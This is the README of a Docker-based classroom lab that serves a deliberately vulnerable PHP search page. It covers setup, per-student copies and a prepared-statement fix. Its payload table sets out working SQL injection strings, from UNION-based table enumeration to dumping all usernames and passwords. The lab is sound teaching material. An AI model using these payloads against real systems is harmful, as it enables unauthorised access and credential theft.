# SQL Injection Lab: Level 1

A deliberately vulnerable PHP "product search" page for learning SQL Injection.
Everything runs in Docker, so you don't need PHP or MySQL installed.

> ⚠️ **For education only.** This app is vulnerable on purpose. The port is bound
> to `127.0.0.1`, so only your own machine can reach it. Never expose it to a
> network you don't control.

## Project layout

```
sql-injection-lab/
├── docker-compose.yml   # web (PHP 8.2 + Apache) and db (MySQL 8.0) services
├── Dockerfile           # php:8.2-apache plus the mysqli extension
├── setup.sql            # creates sqli_lab with the products and users tables
├── README.md
└── www/                 # mounted live into the container as /var/www/html
    ├── index.php        # the vulnerable search page ($studentName is on line 3)
    ├── logo.png         # university logo shown in the page header
    └── students/        # optional: one sub-folder per student (see below)
```

## Requirements

- Docker with the Compose plugin (`docker compose version` should work)

## Start the lab

```bash
cd sql-injection-lab
docker compose up -d
```

The first start builds the PHP image and initialises MySQL, which takes
roughly 20–60 seconds. Then open **http://localhost:8080**.

Check status and logs:

```bash
docker compose ps
docker compose logs -f        # Ctrl+C to stop following
```

## Edit the code live

`./www` is mounted into the container. Edit `www/index.php` (or any file in
`www/`), save it, and refresh the browser. You don't need to rebuild or restart.

## Stop the lab

```bash
docker compose down           # stops and removes containers; database data is kept
```

## Reset the database

`setup.sql` runs only the first time MySQL starts with an empty data volume.
To get a fresh database (for example after changing `setup.sql` or breaking
the data), delete the volume:

```bash
docker compose down -v        # -v also deletes the database volume
docker compose up -d
```

## Inspect the database directly

```bash
docker compose exec db mysql -ulab_user -plab_pass sqli_lab
```

```sql
SHOW TABLES;
SELECT * FROM users;
```

## Example SQL Injection payloads

The page runs:

```sql
SELECT id, name, price FROM products WHERE id = <your input>
```

The input is **numeric and unquoted**, so you don't need a `'` to break
out of the query. Type the payloads into the search box, or put them in
the URL (`http://localhost:8080/?id=...`). The page shows the exact query it
ran, which helps you see what each payload does.

| Goal | Payload | What happens |
|------|---------|--------------|
| Normal use | `1` | Returns product 1 |
| Trigger an error | `1'` | A MySQL syntax error is displayed |
| Always-true condition | `1 OR 1=1` | Returns **all** products |
| Always-false condition | `1 AND 1=2` | Returns nothing (useful for blind testing) |
| Comment out the rest | `1 OR 1=1 -- ` | `-- ` (with a trailing space) or `#` ends the query |
| Find the column count | `1 ORDER BY 3` then `1 ORDER BY 4` | `4` fails, so the query has 3 columns |
| Test UNION | `0 UNION SELECT 1,2,3` | Shows a row containing 1, 2, 3 |
| DB info | `0 UNION SELECT database(), version(), user()` | Database name, MySQL version, and current user |
| List tables | `0 UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()` | `products`, `users` |
| List columns | `0 UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'` | `id`, `username`, `password` |
| Dump users | `0 UNION SELECT id, username, password FROM users` | All usernames and passwords |
| One-cell dump | `0 UNION SELECT 1, GROUP_CONCAT(username,':',password), 3 FROM users` | All credentials in a single cell |

> In a URL, encode spaces as `%20` and `#` as `%23`. The search box encodes
> them for you.

### How to fix it

Use a prepared statement so the input is always treated as data, never as SQL:

```php
$stmt = $conn->prepare("SELECT id, name, price FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();
```

## Create a folder per student

Every folder inside `www/` is served by Apache, so each student can get their
own copy of the page at `http://localhost:8080/students/<name>/`.

Each student folder only needs a copy of `index.php`. The logo is loaded from
`/logo.png` at the site root, so there's no need to copy it.

**One student:**

```bash
mkdir -p www/students/alice
cp www/index.php www/students/alice/index.php
# Set the student name inside their copy:
sed -i 's/^\$studentName = ".*";/$studentName = "Alice";/' www/students/alice/index.php
```

Open: http://localhost:8080/students/alice/

**Many students at once:**

```bash
for name in Alice Bob Charlie; do
  dir="www/students/$(echo "$name" | tr '[:upper:]' '[:lower:]')"
  mkdir -p "$dir"
  cp www/index.php "$dir/index.php"
  sed -i "s/^\\\$studentName = \".*\";/\$studentName = \"$name\";/" "$dir/index.php"
done
```

All copies share the same database, and you don't need to restart anything
because the `www/` folder is live-mounted.

> On macOS, use `sed -i ''` in place of `sed -i`, or just open the file and edit
> the `$studentName` line by hand.

## Troubleshooting

| Problem | Fix |
|---------|-----|
| `Connection failed` right after starting | MySQL is still initialising. Wait a few seconds and refresh. |
| Port 8080 already in use | Change `"127.0.0.1:8080:80"` in `docker-compose.yml` to another port, such as `8081:80`. |
| Changes to `setup.sql` have no effect | Reset the database with `docker compose down -v`. |
| `Table 'sqli_lab.users' doesn't exist` | Same fix: reset the database. |
| Logo missing on a student page | Make sure `www/logo.png` exists. Student pages load it from the site root. |
